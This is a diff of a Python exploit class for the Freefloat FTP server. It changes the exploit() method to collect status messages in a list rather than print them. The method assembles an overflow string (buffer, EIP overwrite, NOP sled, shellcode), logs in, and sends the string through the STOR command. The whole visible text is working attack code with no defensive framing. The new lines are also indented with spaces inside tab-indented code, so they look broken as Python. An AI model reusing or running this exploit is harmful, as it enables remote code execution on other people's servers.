@@ -42,25 +42,31 @@ class Freefloat():
 		self.attack_string = self.buffer + self.eip + self.nop_sled + self.shellcode + self.final_pad
 
 	def exploit(self):
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-			print('[*] Connecting to the server')	
-			s.connect((self.ip,self.port))
-			s.recv(1024)
+            results = []
 
-			print('[*] Sending the user')
-			s.send(b'USER doink\r\n')
-			s.recv(1024)
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-			print('[*] Sending the password')
-			s.send(b'PASS letmein\r\n')
-			s.recv(1024)
+                results.append('[*] Connecting to the server')	
+                s.connect((self.ip,self.port))
+                s.recv(1024)
 
-			print('[*] Sending payload')
-			s.send(b'STOR' + self.attack_string + b'\r\n')
+                results.append('[*] Sending the user')
+                s.send(b'USER doink\r\n')
+                s.recv(1024)
 
-			s.close()
+                results.append('[*] Sending the password')
+                s.send(b'PASS letmein\r\n')
+                s.recv(1024)
 
-		except Exception as e:
-			print('[-] There was an error: ' + str(e))
+                results.append('[*] Sending payload')
+                s.send(b'STOR' + self.attack_string + b'\r\n')
+
+                s.close()
+
+            except Exception as e:
+                results.append('[-] ' + str(e))
+
+            finally:
+                return results
